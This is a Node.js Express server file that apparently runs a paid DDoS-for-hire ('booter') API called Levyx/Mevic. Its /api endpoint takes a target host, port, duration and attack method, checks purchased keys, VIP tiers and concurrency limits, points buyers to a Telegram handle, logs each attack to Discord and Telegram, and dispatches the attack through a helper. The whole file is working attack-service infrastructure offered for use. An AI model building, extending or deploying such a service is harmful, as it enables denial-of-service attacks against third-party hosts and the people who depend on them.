const express = require("express");
const app = express();
const router = express.Router();

const fs = require("fs");
const moment = require("moment")
const { Webhook, MessageBuilder } = require("discord-webhook-node");
const clc = require('cli-color');

const { parseJsonFile } = require('./functions/parseJsonFile');
const { attack_logs } = require('./functions/attack_logs');
const { sendAPI } = require('./functions/apis');
const { sendTelegramWebhook } = require('./functions/telegram');

const now = new Date();
const year = now.getFullYear();
const month = ('0' + (now.getMonth() + 1)).slice(-2);
const day = ('0' + now.getDate()).slice(-2);
const options = { hour12: false };
const time = now.toLocaleTimeString([], options);
const formattedDate = `${year}/${month}/${day} ${time}`;
exports.formattedDate = formattedDate;

const read_config = fs.readFileSync("./assets/json_files/config.json");
let config = JSON.parse(read_config);

const API = fs.readFileSync("./assets/json_files/methods.json");
let apis = JSON.parse(API);

const KEYS = fs.readFileSync("./assets/json_files/keys.json");
let keyData = JSON.parse(KEYS);

let slots_taken = 0;
let method_slots = {};
let key_slots = {}
let attacked_hosts = {}

parseJsonFile('./assets/json_files/keys.json');
parseJsonFile('./assets/json_files/config.json');
parseJsonFile('./assets/json_files/methods.json');


console.log(`${clc.whiteBright.bold()}[${formattedDate}] ${clc.blueBright('Levyx')} Manager Webserver ${clc.green.bold('Started')} on Port ${config.webserver_settings.port}`);
console.log(`${clc.whiteBright.bold()}[${formattedDate}] ${clc.blueBright('Levyx')} Manager Started ${clc.green.bold('Successfully')}`);

app.listen(config.webserver_settings.port)



app.set("view engine", "js");
app.set("trust proxy", 1);

app.get("/", (_req, res) => {
  return res.send(`
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <title>Mevic Api</title>
    <link
      rel="icon"
      href="https://about.gitlab.com/images/press/logo/png/gitlab-icon-1-color-black-rgb.png"
    />
    <style type="text/css">
      html {
        background-color: black;
      }
      text {
        font-family: monospace;
        color: rgb(255, 255, 255);
        font-weight: bold;
      }
    </style>
  </head>
  <body>
    <text>Status: Online > Mevic Api</text>
  </body>
</html>

`);
});

app.get("/api", async (req, res) => {
  const KEYS = fs.readFileSync("./assets/json_files/keys.json");
  let keyData = JSON.parse(KEYS);
  const METHODS = fs.readFileSync("./assets/json_files/methods.json");
  let apis = JSON.parse(METHODS);
  const host = req.query.host;
  const port = req.query.port;
  const time = req.query.time;

  const startTime = process.hrtime();

  const elapsedTime = process.hrtime(startTime);
  const durationInMs = elapsedTime[0] * 1000 + elapsedTime[1] / 1000000;
  const method = req.query.method;
  const key = req.query.key;
  const username = req.query.username;




  try {
    parseInt(time);
  } catch (err) {
    return res.send(`
        <html>
        <head>
         <link rel="icon" href="icon.png" type="image/x-icon">
        </head>
        </html>
        <body style='color:white; background-color:#1D1E26;'>time must be an integer`);
  }

  try {
    parseInt(port);
  } catch (err) {
    return res.send(`
        <html>
        <head>
         <link rel="icon" href="icon.png" type="image/x-icon">
        </head>
        </html>
        <body style='color:white; background-color:#1D1E26;'>port must be an integer`);
  }
  
  if (!keyData[key]) return res.send(`
            <html>
            <center>
            <head>
             <link rel="icon" href="icon.png" type="image/x-icon">
            </head>
            </html>
            <body style='color:white; background-color:#1D1E26;'>Key Is Invalid, to purchase plan » <h1>t.me/@udpraw53</h1>
            </center>`);
            
  if (!keyData[key].user) return res.send(`
            <html>
            <center>
            <head>
             <link rel="icon" href="icon.png" type="image/x-icon">
            </head>
            </html>
            <body style='color:white; background-color:#1D1E26;'>Username Is Invalid, to purchase plan » <h1>t.me/@udpraw53</h1>
            </center>`);
            
  if (keyData[key].banned == true) return res.send(`
            <html>
            <center>
            <head>
             <link rel="icon" href="icon.png" type="image/x-icon">
            </head>
            </html>
            <body style='color:white; background-color:#1D1E26;'>Key Is Banned, to unlock » <h1>t.me/@udpraw53</h1>
            </center>`);
            
  if (config.attack_settings.attacks.enabled == false) return res.send(`
        <html>
        <head>
         <link rel="icon" href="icon.png" type="image/x-icon">
        </head>
        </html>
        <body style='color:white; background-color:#1D1E26;'>Attack are disable`);
            
  if (!(host && port && time && method && key && username)) return res.send(`
        <html>
        <head>
         <link rel="icon" href="icon.png" type="image/x-icon">
        </head>
        </html>
        <body style='color:white; background-color:#1D1E26;'>Missing Parameters`);
        
  if (!apis[method]) return res.send(`
        <html>
        <head>
         <link rel="icon" href="icon.png" type="image/x-icon">
        </head>
        </html>
        <body style='color:white; background-color:#1D1E26;'>Invalid Method`);
        
  if (method_slots[method] == apis[method].slots) return res.send(`
        <html>
        <head>
         <link rel="icon" href="icon.png" type="image/x-icon">
        </head>
        </html>
        <body style='color:white; background-color:#1D1E26;'>Maximium Slots Reached for This Method. Please Wait`);
        
  if (keyData[key].vip == false && apis[method].network == "vip") return res.send(`
            <html>
            <center>
            <head>
             <link rel="icon" href="icon.png" type="image/x-icon">
            </head>
            </html>
            <body style='color:white; background-color:#1D1E26;'>You need vip acces, to buy vip » <h1>t.me/@udpraw53</h1>
            </center>`);
        
  if (config.attack_settings.blackisted_hosts.includes(host)) return res.send(`
        <html>
        <head>
         <link rel="icon" href="icon.png" type="image/x-icon">
        </head>
        </html>
        <body style='color:white; background-color:#1D1E26;'>Host is blacklisted`);
        
  if (time > keyData[key]["time"]) return res.send(`
            <html>
            <center>
            <head>
             <link rel="icon" href="icon.png" type="image/x-icon">
            </head>
            </html>
            <body style='color:white; background-color:#1D1E26;'>Maximum time reached, to upgrade your time » <h1>t.me/@udpraw53</h1>
            </center>`);
        
  if (time > apis[method].maxtime) return res.send(`
        <html>
        <head>
         <link rel="icon" href="icon.png" type="image/x-icon">
        </head>
        </html>
        <body style='color:white; background-color:#1D1E26;'>maximum time reached for this method`);
        
  if (key_slots[key] == keyData[key].maxCons) return res.send(`
            <html>
            <center>
            <head>
             <link rel="icon" href="icon.png" type="image/x-icon">
            </head>
            </html>
            <body style='color:white; background-color:#1D1E26;'>maximum concurrents reached, to upgrade your conc » <h1>t.me/@udpraw53</h1>
            </center>`);
        
  if (slots_taken == config.attack_settings.attacks.max_slots) return res.send(`
        <html>
        <head>
         <link rel="icon" href="icon.png" type="image/x-icon">
        </head>
        </html>
        <body style='color:white; background-color:#1D1E26;'>Maximium Slots Reached. Please Wait`);
        
  if (attacked_hosts.hasOwnProperty(host)) return res.send(`
        <html>
        <head>
         <link rel="icon" href="icon.png" type="image/x-icon">
        </head>
        </html>
        <body style='color:white; background-color:#1D1E26;'>Host is already being attacked`);

  if ("expiry" in keyData[key]) {
    const expiry = moment(keyData[key].expiry.toString(), ["MMMM DD, YYYY", "x", "X", "MM/DD/YYYY"]);
    if (expiry.isSameOrBefore(moment())) return res.send(`
        <html>
        <head>
         <link rel="icon" href="icon.png" type="image/x-icon">
        </head>
        </html>
        <body style='color:white; background-color:#1D1E26;'>Key has expired`);
  }

  const user = (keyData[key].user);
  const main = new Webhook(config.discord_settings.webhook_settings.webhook);

  const colour = config.discord_settings.webhook_settings.embed_colour;

  const net = new MessageBuilder()
    .setTitle("API Logs")
    .setColor(`${colour}`)
    .addField(`Host`, `${host}`, true)
    .addField(`Port`, `${port}`, true)
    .addField(`Time`, `${time}`, true)
    .addField(`Method`, `${method}`, true)
    .addField(`Key`, `${key}`, true)
    .addField(`User`, `${user}`, true)
    .setTimestamp();

  if (config.log_settings.telegram_logs == true) {
    sendTelegramWebhook(config.telegram_settings.bot_token, config.telegram_settings.chat_id, `User: ${keyData[key].user}\nKey: ${key}\nHost: ${host}\nPort: ${port}\nTime: ${time}\nMethod: ${method}`)
  }
  if (config.log_settings.webhook_logs == true) {
    main.send(net);
  }
  if (config.log_settings.attack_logs == true) {
    attack_logs(`User: ${keyData[key].user} | Key: ${key}| Host: ${host} | Port: ${port} | Time: ${time} | Method: ${method}`)
  }
  if (config.log_settings.console_logs == true) {
    console.log(`[1;37m[${formattedDate}] Key: ${key} | Username: ${user} | Host: ${host} | Port: ${port} | Time: ${time} | Method: ${method}`)
  }

    sendAPI(host, port, time, method)

  

  attacked_hosts[host] = true;
  key_slots[key] = (key_slots[key] || 0) + 1;
  slots_taken += 1;
  method_slots[method] = (method_slots[method] || 0) + 1;

  if (sendAPI) return res.send(`
<style>
div.a {
	text-align: center;
}
</style>


<h1 style='font-family: monospace; color:rgb(9, 255, 0); text-align: center; font-weight:bold;'>⚡ Successful ⚡</h1>
<div class="a">
<body style='text-align: center; font-family: monospace; background-color:#1D1E26; color:rgb(229, 255, 0); font-size:large; font-weight:bold;'>
<h3>Host: ${host}</h3>
<h4>--------------</h4>
<h3>Port: ${port}</h3>
<h4>--------------</h4>
<h3>Time: ${time}</h3>
<h4>--------------</h4>
<h3>Method: ${method}</h3>
</div>
<br>
<div style='text-align: center; color:white; font-size:large; font-weight: bold;'>
{"host":"${host}","port":"${port}","time":"${time}","method":"${method}"}
</div>`);

  setTimeout(() => {
    method_slots[method] -= 1;
    slots_taken -= 1;
    key_slots[key] -= 1;
    delete attacked_hosts[host];
  }, parseInt(time) * 1000);
});


app.get("/api/methods", (req, res) => {

  let query = req.query;
  let keys = JSON.parse(fs.readFileSync("./assets/json_files/keys.json", "UTF-8").toString());
  let methods = JSON.parse(fs.readFileSync("./assets/json_files/methods.json", "UTF-8").toString());

  if (!query.key) return res.json({ error: true, message: "Invalid API key" });

  if (query.key) {
    if (keys[query.key]) {
      res.json({ error: false, methods: Object.keys(methods) });

    } else {
      return res.status(401).json({ error: true, message: "Invalid API key" });
    }
  } else {
    return res.status(400).json({ error: true, message: "Please provide a key" });
  }
});





app.get("/api/key_info", (req, res) => {

  let key = req.query.key;

  if (!key) return res.json({ error: true, message: "Invalid API key" });

  if (key) {
    if (keyData[key]) {
      res.json({ error: false, username: keys[key].user, expiry: keys[key].expiry, max_cons: keys[key].maxCons, vip: keys[key].vip });

    } else {
      return res.status(401).json({ error: true, message: "Invalid API key" });
    }
  } else {
    return res.status(400).json({ error: true, message: "Please provide a key" });
  }
});



module.exports = { router };